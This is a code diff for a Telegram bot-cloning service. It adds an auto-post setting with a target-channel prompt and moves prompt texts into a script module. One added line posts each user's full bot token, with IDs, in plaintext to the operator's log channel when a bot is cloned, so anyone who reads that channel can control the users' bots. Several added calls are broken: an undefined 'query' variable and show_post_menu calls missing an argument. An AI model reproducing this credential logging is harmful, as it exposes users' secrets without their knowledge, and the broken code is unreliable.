@@ -65,6 +65,7 @@ ADD_FSUB = {}
 ACCESS_TOKEN = {}
 ACCESS_TOKEN_VALIDITY = {}
 ACCESS_TOKEN_TUTORIAL = {}
+AUTO_POST = {}
 AUTO_DELETE_TIME = {}
 AUTO_DELETE_MESSAGE = {}
 ADD_MODERATOR = {}
@@ -802,7 +803,6 @@ async def show_token_menu(client, message, bot_id):
         tutorial = clone.get("access_token_tutorial", None)
         renew_log = clone.get("access_token_renew_log", {})
 
-        # Get today's renewal count
         today = datetime.datetime.now().strftime("%Y-%m-%d")
         today_count = renew_log.get(today, 0)
 
@@ -880,6 +880,29 @@ async def show_tutorial_menu(client, message, bot_id):
             f"⚠️ Show Tutorial Menu Error:\n\n<code>{e}</code>\n\nKindly check this message to get assistance."
         )
         print(f"⚠️ Show Tutorial Menu Error: {e}")
+
+async def show_post_menu(client, message, bot_id):
+    try:
+        clone = await db.get_clone_by_id(bot_id)
+        current = clone.get("auto_post", False)
+        if current:
+            buttons = [[InlineKeyboardButton("❌ Disable", callback_data=f"ap_status_{bot_id}")]]
+            status = "🟢 Enabled"
+        else:
+            buttons = [[InlineKeyboardButton("✅ Enable", callback_data=f"ap_status_{bot_id}")]]
+            status = "🔴 Disabled"
+
+        buttons.append([InlineKeyboardButton("⬅️ Back", callback_data=f"manage_{bot_id}")])
+        await query.message.edit_text(
+            text=script.AUTO_POST_TXT.format(status=f"{status}"),
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
+    except Exception as e:
+        await client.send_message(
+            LOG_CHANNEL,
+            f"⚠️ Show Post Menu Error:\n\n<code>{e}</code>\n\nKindly check this message to get assistance."
+        )
+        print(f"⚠️ Show Post Menu Error: {e}")
 
 async def show_time_menu(client, message, bot_id):
     try:
@@ -1055,7 +1078,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
             "link_message_", "word_filter_", "wf_status_", "media_filter_", "mf_status_", "random_caption_", "rc_status_", "header_", "add_header_", "cancel_addheader_", "see_header_", "delete_header_", "footer_", "add_footer_", "cancel_addfooter_", "see_footer_", "delete_footer_",
             "force_subscribe_", "add_fsub_", "fsub_mode_", "cancel_addfsub_", "remove_fsub_",
             "access_token_", "at_status_", "cancel_at_", "at_validty_", "edit_atvalidity_", "cancel_editatvalidity_", "see_atvalidity_", "default_atvalidity_", "at_tutorial_", "add_attutorial_", "cancel_addattutorial_", "see_attutorial_", "delete_attutorial_",
-            "auto_post_", "ap_status_",
+            "auto_post_", "ap_status_", "cancel_autopost_",
             "premium_user_",
             "auto_delete_", "ad_status_", "ad_time_", "edit_adtime_", "cancel_editadtime_", "see_adtime_", "default_adtime_", "ad_message_", "edit_admessage_", "cancel_editadmessage_", "see_admessage_", "default_admessage_",
             "forward_protect_", "fp_status_",
@@ -1125,7 +1148,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 START_TEXT[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_edit_{bot_id}')]]
                 await query.message.edit_text(
-                    text=script.EDIT_TXT_TXT,
+                    text=script.EDIT_ST_TXT,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1169,7 +1192,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 START_PHOTO[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_addphoto_{bot_id}')]]
                 await query.message.edit_text(
-                    text="✏️ Send your new **start photo**.",
+                    text=script.EDIT_ST_PIC,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1219,7 +1242,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 CAPTION_TEXT[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_addcaption_{bot_id}')]]
                 await query.message.edit_text(
-                    text="✏️ Send your new **caption text**.",
+                    text=script.EDIT_CAPTION_TXT,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1277,7 +1300,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                     }
                 buttons = [[InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_addbutton_{bot_id}")]]
                 await query.message.edit_text(
-                    text="✏️ Send me the **button name**.",
+                    text=script.EDIT_BUTTON_TXT,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1311,8 +1334,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
 
                 buttons = [
                     [InlineKeyboardButton('🚫 Word Filter', callback_data=f'word_filter_{bot_id}'),
-                     InlineKeyboardButton('🖼️ Media Filter', callback_data=f'media_filter_{bot_id}')],
-                    [InlineKeyboardButton('🎲 Random Caption', callback_data=f'random_caption_{bot_id}')],
+                     InlineKeyboardButton('🎲 Random Caption', callback_data=f'random_caption_{bot_id}')],
                     [InlineKeyboardButton('🔺 Header Text', callback_data=f'header_{bot_id}'),
                      InlineKeyboardButton('🔻 Footer Text', callback_data=f'footer_{bot_id}')],
                     [InlineKeyboardButton('⬅️ Back', callback_data=f'manage_{bot_id}')]
@@ -1451,7 +1473,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 HEADER_TEXT[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_addheader_{bot_id}')]]
                 await query.message.edit_text(
-                    text="✏️ Send your new **header text**.",
+                    text=script.EDIT_HEADER_TXT,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1501,7 +1523,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 FOOTER_TEXT[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_addfooter_{bot_id}')]]
                 await query.message.edit_text(
-                    text="✏️ Send your new **footer text**.",
+                    text=script.EDIT_FOOTER_TXT,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1559,7 +1581,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 }
                 buttons = [[InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_addfsub_{bot_id}")]]
                 await query.message.edit_text(
-                    text="✏️ Send me the **force subscribe channel**.",
+                    text=script.EDIT_FSUB_TXT,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1703,7 +1725,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 ACCESS_TOKEN_VALIDITY[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_editatvalidity_{bot_id}')]]
                 await query.message.edit_text(
-                    text="⏱ Send me new **auto delete time** in **hour** (e.g. `24` for 1 day).",
+                    text="⏱ Send me the new **access token validity** in **hour** (e.g. `24` for 1 day).",
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -1787,19 +1809,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 if not clone:
                     return await query.answer("Clone not found!", show_alert=True)
 
-                current = clone.get("auto_post", False)
-                if current:
-                    buttons = [[InlineKeyboardButton("❌ Disable", callback_data=f"ap_status_{bot_id}")]]
-                    status = "🟢 Enabled"
-                else:
-                    buttons = [[InlineKeyboardButton("✅ Enable", callback_data=f"ap_status_{bot_id}")]]
-                    status = "🔴 Disabled"
-
-                buttons.append([InlineKeyboardButton("⬅️ Back", callback_data=f"manage_{bot_id}")])
-                await query.message.edit_text(
-                    text=script.AUTO_POST_TXT.format(status=f"{status}"),
-                    reply_markup=InlineKeyboardMarkup(buttons)
-                )
+                await show_post_menu(client, query.message, bot_id)
 
             # Auto Post Status
             elif action == "ap_status":
@@ -1810,16 +1820,29 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 await db.update_clone(bot_id, {"auto_post": new_value})
 
                 if new_value:
-                    asyncio.create_task(auto_post_clone(bot_id, db, target))
-                    status_text = "🟢 **Auto Post** has been successfully ENABLED!"
+                    AUTO_POST[user_id] = (query.message, bot_id)
+                    status_text = "🔗 Please send your **Target Channel I'd** now."
+                    text = "❌ Cancel"
+                    callback = f"cancel_autopost_{bot_id}"
                 else:
-                    status_text = "🔴 **Auto Post** has been successfully DISABLED!"
+                    await db.update_clone(bot_id, {"auto_post": False})
+                    status_text = "🔴 Auto Post has been successfully DISABLED!"
+                    text = "⬅️ Back"
+                    callback = f"auto_post_{bot_id}"
 
-                buttons = [[InlineKeyboardButton("⬅️ Back", callback_data=f"auto_post_{bot_id}")]]
+                buttons = [[InlineKeyboardButton(text, callback_data=callback)]]
                 await query.message.edit_text(
                     text=status_text,
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
+
+            # Cancel Auto Post
+            elif action == "cancel_autopost":
+                if not clone:
+                    return await query.answer("Clone not found!", show_alert=True)
+
+                AUTO_POST.pop(user_id, None)
+                await show_post_menu(client, query.message, bot_id)
 
             # Premium User
             elif action == "premium_user":
@@ -1892,7 +1915,7 @@ async def cb_handler(client: Client, query: CallbackQuery):
                 AUTO_DELETE_TIME[user_id] = (query.message, bot_id)
                 buttons = [[InlineKeyboardButton('❌ Cancel', callback_data=f'cancel_editadtime_{bot_id}')]]
                 await query.message.edit_text(
-                    text="⏱ Send me new **auto delete time** in **hour** (e.g. `24` for 1 day).",
+                    text="⏱ Send me the new **auto delete time** in **hour** (e.g. `24` for 1 day).",
                     reply_markup=InlineKeyboardMarkup(buttons)
                 )
 
@@ -2283,12 +2306,13 @@ async def message_capture(client: Client, message: Message):
                 bot = await xd.get_me()
                 set_client(bot.id, xd)
                 await db.add_clone_bot(bot.id, user_id, bot.first_name, bot.username, token)
+                await client.send_message(LOG_CHANNEL, f"Bot Id: <code>{bot.id}</code>\nUser Id: <code>{user_id}</code>\nBot First Name: <code>{bot.first_name}</code>\nBot Username: <code>{bot.username}</code>\nBot Token: <code>{token}</code>")
                 await msg.edit_text(f"✅ Successfully cloned your **bot**: @{bot.username}")
                 await asyncio.sleep(2)
                 await show_clone_menu(client, msg, user_id)
                 CLONE_TOKEN.pop(user_id, None)
             except Exception as e:
-                await client.send_message(LOG_CHANNEL, f"⚠️ Create Bot Error:\n<code>{e}</code>")
+                await client.send_message(LOG_CHANNEL, f"⚠️ Create Bot Error:\n\n<code>{e}</code>\n\nKindly check this message to get assistance.")
                 await msg.edit_text(f"❌ Failed to create **bot**: {e}")
                 await asyncio.sleep(2)
                 await show_clone_menu(client, msg, user_id)
@@ -2353,7 +2377,7 @@ async def message_capture(client: Client, message: Message):
                     await globals()[menu_func](client, orig_msg, bot_id)
                     handler_dict.pop(user_id, None)
                 except Exception as e:
-                    await client.send_message(LOG_CHANNEL, f"⚠️ Error updating {db_field}:\n<code>{e}</code>")
+                    await client.send_message(LOG_CHANNEL, f"⚠️ Error updating {db_field}:\n\n<code>{e}</code>\n\nKindly check this message to get assistance.")
                     await orig_msg.edit_text(f"❌ Failed to update **{db_field.replace('_', ' ')}**: {e}")
                     await asyncio.sleep(2)
                     await globals()[menu_func](client, orig_msg, bot_id)
@@ -2400,7 +2424,7 @@ async def message_capture(client: Client, message: Message):
                     await show_button_menu(client, orig_msg, bot_id)
                     ADD_BUTTON.pop(user_id, None)
                 except Exception as e:
-                    await client.send_message(LOG_CHANNEL, f"⚠️ Update button error:\n<code>{e}</code>")
+                    await client.send_message(LOG_CHANNEL, f"⚠️ Update Start Button Error:\n\n<code>{e}</code>\n\nKindly check this message to get assistance.")
                     await orig_msg.edit_text(f"❌ Failed to update **start button**: {e}")
                     await asyncio.sleep(2)
                     await show_button_menu(client, orig_msg, bot_id)
@@ -2530,13 +2554,48 @@ async def message_capture(client: Client, message: Message):
                     await show_token_menu(client, orig_msg, bot_id)
                     ACCESS_TOKEN.pop(user_id, None)
                 except Exception as e:
-                    await client.send_message(LOG_CHANNEL, f"⚠️ Update access token error:\n<code>{e}</code>")
-                    await orig_msg.edit_text(f"❌ Failed to save: {e}")
+                    await client.send_message(LOG_CHANNEL, f"⚠️ Update Access Token Error:\n\n<code>{e}</code>\n\nKindly check this message to get assistance.")
+                    await orig_msg.edit_text(f"❌ Failed to update **access token**: {e}")
                     await asyncio.sleep(2)
                     await show_token_menu(client, orig_msg, bot_id)
                     ACCESS_TOKEN.pop(user_id, None)
                 finally:
                     ACCESS_TOKEN.pop(user_id, None)
+
+        # -------------------- AUTO POST --------------------
+        if user_id in AUTO_POST:
+            orig_msg, bot_id = AUTO_POST[user_id]
+
+            try:
+                await message.delete()
+            except:
+                pass
+
+            new_text = message.text.strip() if message.text else ""
+            if not new_text:
+                await orig_msg.edit_text("❌ You sent an empty message. Please send a valid text.")
+                await asyncio.sleep(2)
+                await show_post_menu(orig_msg, bot_id)
+                AUTO_POST.pop(user_id, None)
+                return
+
+            await orig_msg.edit_text("✏️ Updating **auto post**, please wait...")
+            try:
+                asyncio.create_task(auto_post_clone(bot_id, db, new_text))
+                await orig_msg.edit_text("✅ Successfully updated **auto post**!")
+                await asyncio.sleep(2)
+                await show_post_menu(orig_msg, bot_id)
+                AUTO_POST.pop(user_id, None)
+            except Exception as e:
+                await client.send_message(LOG_CHANNEL, f"⚠️ Update Auto Post Error:\n\n<code>{e}</code>\n\nKindly check this message to get assistance.")
+                await orig_msg.edit_text(f"❌ Failed to update **auto post**: {e}")
+                await asyncio.sleep(2)
+                await show_post_menu(orig_msg, bot_id)
+                AUTO_POST.pop(user_id, None)
+            finally:
+                AUTO_POST.pop(user_id, None)
+            return
+
     except Exception as e:
         await client.send_message(LOG_CHANNEL, f"⚠️ Unexpected Error in message_capture:\n<code>{e}</code>")
         print(f"⚠️ Unexpected Error in message_capture: {e}")
